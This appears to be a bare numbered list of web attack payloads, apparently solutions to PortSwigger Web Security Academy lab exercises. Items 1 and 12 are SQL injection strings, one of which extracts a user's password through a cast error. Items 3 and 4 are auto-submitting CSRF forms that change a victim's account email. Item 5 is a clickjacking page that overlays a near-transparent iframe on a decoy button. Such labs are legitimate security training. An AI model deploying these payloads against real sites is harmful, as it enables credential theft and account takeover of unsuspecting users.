1. ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

3. <form method="POST" action="https://0a0c005f033c58008046c616006d0003.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="Wiener@websecurity.net">
</form>
<script>
        document.forms[0].submit();
</script>

4. <form action="https://0a9b00fa0416b229820142c5003f00e0.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="Wiener@websecurity.net">
</form>
<script>
        document.forms[0].submit();
</script>


5. <style>
    iframe {
        position:relative;
        width:450px;
        height:700px;
        opacity:0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click here</div>
<iframe src="https://0a9500b304442a548228116000380086.web-security-academy.net/my-account?email=openxt@test.cst"></iframe>

12. '+UNION+SELECT+NULL--
